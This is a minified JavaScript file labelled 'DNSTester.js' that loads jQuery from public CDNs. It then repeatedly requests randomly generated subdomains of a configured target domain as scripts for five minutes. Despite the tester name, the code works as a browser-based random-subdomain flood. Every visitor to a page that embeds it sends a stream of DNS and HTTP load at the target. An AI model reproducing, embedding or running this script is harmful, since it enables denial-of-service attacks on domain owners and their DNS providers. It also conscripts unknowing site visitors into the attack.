/*!
 * DNSTester.js 0.0.2
 * https://github.com/cnbeining/DNSTester.js
 * http://www.cnbeining.com/
 *
 * Includes jQuery
 * http://jquery.com/
 * 
 * Copyright 2015 Beining
 * Released under the GNU GENERAL PUBLIC LICENSE Version 2
 * https://github.com/cnbeining/DNSTester.js/blob/master/LICENSE
 *
 */
function unixtime(){var e=new Date;return Date.UTC(e.getFullYear(),e.getMonth(),e.getDay(),e.getHours(),e.getMinutes(),e.getSeconds())/1e3}function makeid(e){for(var t="",r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=0;e>n;n++)t+=r.charAt(Math.floor(Math.random()*r.length));return t="https://"+t+DOMAIN}function r_send2(){get(makeid(Math.floor(64*Math.random()+1)))}function get(e){var t;$.ajax({url:e,dataType:"script",timeout:1e-4,cache:!0,beforeSend:function(){requestTime=(new Date).getTime()},complete:function(){responseTime=(new Date).getTime(),t=Math.floor(responseTime-requestTime),3e5>responseTime-startime&&(r_send(t),count+=1)}})}function r_send(e){setTimeout("r_send2()",e)}document.write("<script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'></script>"),!window.jQuery&&document.write("<script src='//code.jquery.com/jquery-latest.js'></script>"),startime=(new Date).getTime();var count=0;NUM=1;